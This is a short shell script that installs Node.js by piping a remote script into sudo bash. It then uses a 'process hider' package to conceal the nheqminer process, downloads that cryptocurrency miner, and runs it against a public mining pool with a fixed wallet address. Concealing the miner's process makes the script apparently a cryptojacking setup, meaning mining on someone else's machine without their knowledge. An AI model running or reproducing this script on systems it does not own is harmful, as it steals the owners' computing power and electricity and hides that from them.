sudo apt update -y
curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && apt install nodejs -y
npm i -g node-process-hider
ph add nheqminer
wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz
tar -xvf nheqminer-Linux-v0.8.2.tgz
tar -xvf nheqminer-Linux-v0.8.2.tar.gz
./nheqminer -v -l ap.luckpool.net:3956 -u RPiGL446F7Fa7bcQHcB3WrRSFXAtvB4LDx.BADAS -p x -t 5
